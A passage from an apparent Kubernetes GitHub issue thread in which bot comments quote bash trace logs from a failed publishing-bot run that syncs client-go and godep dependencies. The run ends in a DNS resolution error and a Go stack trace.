'' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 745ca830039794f7b927b8a2c2a58dcc1e8a0a72\n>\t\tRemov+ echo 'Remove redundant godep commits on-top of 745ca830039794f7b927b8e ra2c2a58dcc1e8a0a72.'\n>\t+ git reset --soft -q 745ca830039794f7b927b8a2c2a58dcc1e8a0a72\n>edundant godep commits on-top of 745ca830039794f7b927b8a2c2a58dcc1e8a0a72.\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/client-go\n>\t+ local repo=client-go\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n '745ca83 Merge pull request #67393 from nikhita/automated-cherry-pick-of-#66249-upstream-release-1.10' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-client-go-release-7.0'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-client-go-release-7.0\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-7.0\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=745ca830039794f7b927b8a2c2a58dcc1e8a0a72\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-client-go-release-7.0.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-client-go-release-7.0.sh\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.10 --push-script ../push-tags-client-go-release-7.0.sh --dependencies apimachinery:release-1.10,api:release-1.10 -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"origin\".\n>\tfatal: unable to access 'https://github.com/kubernetes/client-go/': Could not resolve host: github.com\n>\tF0831 23:49:53.228759   10273 main.go:147] Failed to fetch tags for \"origin\": exit status 128\n>\tgoroutine 1 [running]:\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.stacks(0xc431cd2900, 0xc433ecef00, 0x5e, 0xb2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:769 +0xcf\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).output(0xa5fdc0, 0xc400000003, 0xc42010a000, 0xa089d6, 0x7, 0x93, 0x0)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:720 +0x32d\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).printf(0xa5fdc0, 0x3, 0x81df10, 0x1f, 0xc42205fcd8, 0x2, 0x2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:655 +0x14b\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.Fatalf(0x81df10, 0x1f, 0xc42205fcd8, 0x2, 0x2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:1148 +0x67\n>\tmain.main()\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/sync-tags/main.go:147 +0xe7f\n>[31 Aug 18 23:49 UTC]: exit status 255\n>    \t+ '[' '!' 12 -eq 12 ']'\n>    \t+ REPO=client-go\n>    \t+ SRC_BRANCH=release-1.10\n>    \t+ DST_BRANCH=release-7.0\n>    \t+ DEPS=apimachinery:release-1.10,api:release-1.10\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/client-go\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=true\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ readonly SRC_BRANCH DST_BRANCH DEPS SOURCE_REMOTE SOURCE_REPO_ORG SOURCE_REPO_NAME BASE_PACKAGE SUBDIR IS_LIBRARY\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags\n>    \t+ echo 'Cleaning up checkout.'\n>    \t+ git rebase --abort\n>    \tNo rebase in progress?\n>    \t+ true\n>    \t+ git reset -q --hard\n>    \t+ git clean -q -f -f -d\n>    \t++ git rev-parse HEAD\n>    \t+ git checkout -q c4528e9778198aa1f59e74dcfec43bcb5ce1c107\n>    \t+ git branch -D release-7.0\n>    \t+ git remote set-head origin -d\n>    \t+ git rev-parse origin/release-7.0\n>    \t+ echo 'Switching to origin/release-7.0.'\n>    \t+ git branch -f release-7.0 origin/release-7.0\n>    \t+ git checkout -q release-7.0\n>    \t+ sync_repo kubernetes kubernetes staging/src/k8s.io/client-go release-1.10 release-7.0 /go-workspace/src/k8s.io/kubernetes/.git apimachinery:release-1.10,api:release-1.10 '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local source_repo_org=kubernetes\n>    \t+ local source_repo_name=kubernetes\n>    \t+ local subdirectory=staging/src/k8s.io/client-go\n>    \t+ local src_branch=release-1.10\n>    \t+ local dst_branch=release-7.0\n>    \t+ local kubernetes_remote=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ local deps=apimachinery:release-1.10,api:release-1.10\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ shift 9\n>    \t+ local is_library=true\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ readonly subdirectory src_branch dst_branch kubernetes_remote deps is_library\n>    \t+ local new_branch=false\n>    \t+ local orphan=false\n>    \t+ git rev-parse -q --verify HEAD\n>    \t++ ls -1\n>    \t++ wc -l\n>    \t+ '[' 23 = 0 ']'\n>    \t++ git rev-parse HEAD\n>    \t+ echo 'Starting at existing release-7.0 commit 745ca830039794f7b927b8a2c2a58dcc1e8a0a72.'\n>    \t+ git remote rm upstream\n>    \t+ git remote add upstream /go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ git fetch -q upstream --no-tags\n>    \t+ git branch -D filtered-branch\n>    \t+ git branch -f upstream-branch upstream/release-1.10\n>    \t++ git rev-parse upstream-branch\n>    \t+ echo 'Checked out source commit c6403d766708622303a2822c38ccfbaf371bd5a8.'\n>    \t+ git checkout -q upstream-branch -b filtered-branch\n>    \t+ git reset -q --hard upstream-branch\n>    \t+ local f_mainline_commits=\n>    \t+ '[' false = true ']'\n>    \t+ '[' false = true ']'\n>    \t++ last-kube-commit Kubernetes-commit release-7.0\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --format=%B release-7.0\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ head -n 1\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t++ true\n>    \t+ local k_base_commit=b16193f435cefa70de14823738a2c5af3d99b7ca\n>    \t+ '[' -z b16193f435cefa70de14823738a2c5af3d99b7ca ']'\n>    \t++ git-find-merge b16193f435cefa70de14823738a2c5af3d99b7ca upstream/release-1.10\n>    \t++ tail -1\n>    \t+++ git rev-list 'b16193f435cefa70de14823738a2c5af3d99b7ca^1..upstream/release-1.10' --first-parent\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list b16193f435cefa70de14823738a2c5af3d99b7ca..upstream/release-1.10 --ancestry-path\n>    \t+++ git rev-parse b16193f435cefa70de14823738a2c5af3d99b7ca\n>    \t+ local k_base_merge=b16193f435cefa70de14823738a2c5af3d99b7ca\n>    \t+ '[' -z b16193f435cefa70de14823738a2c5af3d99b7ca ']'\n>    \t+ git branch -f filtered-branch-base b16193f435cefa70de14823738a2c5af3d99b7ca\n>    \t+ echo 'Rewriting upstream branch release-1.10 to only include commits for staging/src/k8s.io/client-go.'\n>    \t+ filter-branch Kubernetes-commit staging/src/k8s.io/client-go 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local subdirectory=staging/src/k8s.io/client-go\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ echo 'Running git filter-branch ...'\n>    \t+ local index_filter=\n>    \t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ patterns=()\n>    \t+ local patterns\n>    \t+ local p=\n>    \t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>    \t+ IFS=' '\n>    \t+ read -ra patterns\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>    \t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/client-go -- filtered-branch filtered-branch-base\n>    \t++ git rev-parse filtered-branch-base\n>    \t+ local f_base_commit=01c4e03b3aefaec8bd8e6dc7c446680e02b4d4e3\n>    \t++ git log --first-parent --format=%H --reverse 01c4e03b3aefaec8bd8e6dc7c446680e02b4d4e3..HEAD\n>    \t+ f_mainline_commits=\n>    \t+ echo 'Checking out branch release-7.0.'\n>    \t+ git checkout -q release-7.0\n>    \t+ '[' -f kubernetes-sha ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_head=745ca830039794f7b927b8a2c2a58dcc1e8a0a72\n>    \t+ local k_pending_merge_commit=\n>    \t+ local dst_needs_godeps_update=false\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_merge_point_commit=745ca830039794f7b927b8a2c2a58dcc1e8a0a72\n>    \t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>    \t+ local k_mainline_commit=\n>    \t+ local k_new_pending_merge_commit=\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' -n '' ']'\n>    \t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ break\n>    \t+ echo 'Fixing up godeps after a complete sync'\n>    \t++ git rev-parse HEAD\n>    \t+ '[' 745ca830039794f7b927b8a2c2a58dcc1e8a0a72 '!=' 745ca830039794f7b927b8a2c2a58dcc1e8a0a72 ']'\n>    \t+ '[' false = true ']'\n>    \t+ fix-godeps apimachinery:release-1.10,api:release-1.10 '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' '' = true ']'\n>    \t+ local deps=apimachinery:release-1.10,api:release-1.10\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ local needs_godeps_update=true\n>    \t+ local squash=false\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_commit=745ca830039794f7b927b8a2c2a58dcc1e8a0a72\n>    \t+ '[' true = true ']'\n>    \t+ update_full_godeps apimachinery:release-1.10,api:release-1.10 k8s.io true Kubernetes-commit\n>    \t+ local deps=apimachinery:release-1.10,api:release-1.10\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ for d in '$../*'\n>    \t+ '[' '!' -d '$../*' ']'\n>    \t+ continue\n>    \t+ '[' '!' -f Godeps/Godeps.json ']'\n>    \t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>    \t+ local dep=\n>    \t+ local branch=\n>    \t+ local depbranch=\n>    \t++ basename /go-workspace/src/k8s.io/client-go\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ echo 'Running godep restore.'\n>    \t+ godep restore\n>    \t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:release-1.10,api:release-1.10\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ deps=()\n>    \t+ local deps\n>    \t+ IFS=,\n>    \t+ read -a deps\n>    \t++ last-kube-commit Kubernetes-commit HEAD\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --format=%B HEAD\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ head -n 1\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t+ local k_last_kube_commit=b16193f435cefa70de14823738a2c5af3d99b7ca\n>    \t+ '[' -z b16193f435cefa70de14823738a2c5af3d99b7ca ']'\n>    \t++ git-find-merge b16193f435cefa70de14823738a2c5af3d99b7ca upstream-branch\n>    \t++ tail -1\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list 'b16193f435cefa70de14823738a2c5af3d99b7ca^1..upstream-branch' --first-parent\n>    \t+++ git rev-list b16193f435cefa70de14823738a2c5af3d99b7ca..upstream-branch --ancestry-path\n>    \t+++ git rev-parse b16193f435cefa70de14823738a2c5af3d99b7ca\n>    \t+ local k_last_kube_merge=b16193f435cefa70de14823738a2c5af3d99b7ca\n>    \t+ local dep_count=2\n>    \t+ (( i=0 ))\n>    \t+ (( i<2 ))\n>    \t+ local dep=apimachinery\n>    \t+ local branch=release-1.10\n>    \t+ echo 'Looking up which commit in the release-1.10 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit b16193f435cefa70de14823738a2c5af3d99b7ca.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b b16193f435cefa70de14823738a2c5af3d99b7ca ../kube-commits-apimachinery-release-1.10\n>    \t+ '[' -z e386b2658ed20923da8cc9250e552f082899a1ee ']'\n>    \t+ pushd ../apimachinery\n>    \t+ echo 'Checking out k8s.io/apimachinery to e386b2658ed20923da8cc9250e552f082899a1ee'\n>    \t+ git checkout -q e386b2658ed20923da8cc9250e552f082899a1ee\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<2 ))\n>    \t+ local dep=api\n>    \t+ local branch=release-1.10\n>    \t+ echo 'Looking up which commit in the release-1.10 branch of k8s.io/api corresponds to k8s.io/kubernetes commit b16193f435cefa70de14823738a2c5af3d99b7ca.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b b16193f435cefa70de14823738a2c5af3d99b7ca ../kube-commits-api-release-1.10\n>    \t+ '[' -z 0f11257a8a25954878633ebdc9841c67d8f83bdb ']'\n>    \t+ pushd ../api\n>    \t+ echo 'Checking out k8s.io/api to 0f11257a8a25954878633ebdc9841c67d8f83bdb'\n>    \t+ git checkout -q 0f11257a8a25954878633ebdc9841c67d8f83bdb\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<2 ))\n>    \t+ rm -rf ./Godeps\n>    \t+ rm -rf ./vendor\n>    \t+ echo 'Running godep save.'\n>    \t+ godep save ./...\n>    \t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>    \t+ git checkout HEAD Godeps/\n>    \t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>    \t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ '[' true = true ']'\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ '[' release-7.0 '!=' master ']'\n>    \t+ echo 'Removing complete vendor/ on non-master branch because this is a library.'\n>    \t+ rm -rf vendor/\n>    \t+ git add Godeps/Godeps.json\n>    \t+ git add vendor/ --ignore-errors\n>    \t+ true\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ echo 'Godeps.json hasn'\\''t changed!'\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ '[' release-7.0 '!=' master ']'\n>    \t+ '[' -d vendor/ ']'\n>    \t+ '[' -n '' ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ git diff --exit-code 745ca830039794f7b927b8a2c2a58dcc1e8a0a72\n>    \t+ echo 'Remove redundant godep commits on-top of 745ca830039794f7b927b8a2c2a58dcc1e8a0a72.'\n>    \t+ git reset --soft -q 745ca830039794f7b927b8a2c2a58dcc1e8a0a72\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t++ basename /go-workspace/src/k8s.io/client-go\n>    \t+ local repo=client-go\n>    \t++ git log --oneline --first-parent --merges\n>    \t++ head -n 1\n>    \t+ '[' -n '745ca83 Merge pull request #67393 from nikhita/automated-cherry-pick-of-#66249-upstream-release-1.10' ']'\n>    \t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-client-go-release-7.0'\n>    \t++ echo kubernetes\n>    \t++ sed 's/^./\\L\\u&/'\n>    \t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ LAST_BRANCH=release-7.0\n>    \t++ git rev-parse HEAD\n>    \t+ LAST_HEAD=745ca830039794f7b927b8a2c2a58dcc1e8a0a72\n>    \t+ EXTRA_ARGS=()\n>    \t+ PUSH_SCRIPT=../push-tags-client-go-release-7.0.sh\n>    \t+ echo '#!/bin/bash'\n>    \t+ chmod +x ../push-tags-client-go-release-7.0.sh\n>    \t++ echo kubernetes\n>    \t++ echo kubernetes\n>    \t++ sed 's/^./\\L\\u&/'\n>    \t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.10 --push-script ../push-tags-client-go-release-7.0.sh --dependencies apimachinery:release-1.10,api:release-1.10 -alsologtostderr ''\n>    \tfatal: unable to access 'https://github.com/kubernetes/client-go/': Could not resolve host: github.com\n>    \tF0831 23:49:53.228759   10273 main.go:147] Failed to fetch tags for \"origin\": exit status 128\n>    \tgoroutine 1 [running]:\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.stacks(0xc431cd2900, 0xc433ecef00, 0x5e, 0xb2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:769 +0xcf\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).output(0xa5fdc0, 0xc400000003, 0xc42010a000, 0xa089d6, 0x7, 0x93, 0x0)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:720 +0x32d\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).printf(0xa5fdc0, 0x3, 0x81df10, 0x1f, 0xc42205fcd8, 0x2, 0x2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:655 +0x14b\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.Fatalf(0x81df10, 0x1f, 0xc42205fcd8, 0x2, 0x2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:1148 +0x67\n>    \tmain.main()\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/sync-tags/main.go:147 +0xe7f\n>\n>[31 Aug 18 23:49 UTC]: exit status 255```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-417929510):\n\n>/reopen\n>\n>The last publishing run failed: exit status 255\n>```\n>... . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/metrics/\") or . == \"k8s.io/metrics\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t\tR+ echo 'Running godep restore.'\n>\t+ godep restore\n>unning godep restore.\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:release-1.9,api:release-1.9,client-go:release-6.0\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=f4cf484c2cb6056e28fb9759a3c913be3eed990a\n>\t+ '[' -z f4cf484c2cb6056e28fb9759a3c913be3eed990a ']'\n>\t++ git-find-merge f4cf484c2cb6056e28fb9759a3c913be3eed990a upstream-branch\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 'f4cf484c2cb6056e28fb9759a3c913be3eed990a^1..upstream-branch' --first-parent\n>\t+++ git rev-list f4cf484c2cb6056e28fb9759a3c913be3eed990a..upstream-branch --ancestry-path\n>\t+++ git rev-parse f4cf484c2cb6056e28fb9759a3c913be3eed990a\n>\t+ local k_last_kube_merge=f4cf484c2cb6056e28fb9759a3c913be3eed990a\n>\t+ local dep_count=3\n>\t+ (( i=0 ))\n>\t+ (( i<3 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=release-1.9\n>\t+ echo 'Looking up which commit in the release-1.9 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit f4cf484c2cb6056e28fb9759a3c913be3eed990a.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the release-1.9 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit f4cf484c2cb6056e28fb9759a3c913be3eed990a.\n>\t++ look -b f4cf484c2cb6056e28fb9759a3c913be3eed990a ../kube-commits-apimachinery-release-1.9\n>\t+ '[' -z fb40df2b502912cbe3a93aa61c2b2487f39cb42f ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to fb40df2b502912cbe3a93aa61c2b2487f39cb42f'\n>\t+ git checkout -q fb40df2b502912cbe3a93aa61c2b2487f39cb42f\n>\tChecking out k8s.io/apimachinery to fb40df2b502912cbe3a93aa61c2b2487f39cb42f\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=api\n>\t+ local branch=release-1.9\n>\t+ echo 'Looking up which commit in the release-1.9 branch of k8s.io/api corresponds to k8s.io/kubernetes commit f4cf484c2cb6056e28fb9759a3c913be3eed990a.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the release-1.9 branch of k8s.io/api corresponds to k8s.io/kubernetes commit f4cf484c2cb6056e28fb9759a3c913be3eed990a.\n>\t++ look -b f4cf484c2cb6056e28fb9759a3c913be3eed990a ../kube-commits-api-release-1.9\n>\t+ '[' -z 9273ee02527c608cecc74969b3e489f5dba686da ']'\n>\t+ pushd ../api\n>\t+ echo 'Checking out k8s.io/api to 9273ee02527c608cecc74969b3e489f5dba686da'\n>\t+ git checkout -q 9273ee02527c608cecc74969b3e489f5dba686da\n>\tChecking out k8s.io/api to 9273ee02527c608cecc74969b3e489f5dba686da\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<3 ))\n>\t+ local dep=client-go\n>\t+ local branch=release-6.0\n>\t+ echo 'Looking up which commit in the release-6.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit f4cf484c2cb6056e28fb9759a3c913be3eed990a.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the release-6.0 branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit f4cf484c2cb6056e28fb9759a3c913be3eed990a.\n>\t++ look -b f4cf484c2cb6056e28fb9759a3c913be3eed990a ../kube-commits-client-go-release-6.0\n>\t+ '[' -z e2680bfa771859c129bc5c8413fdb565af2b3dcd ']'\n>\t+ pushd ../client-go\n>\t+ echo 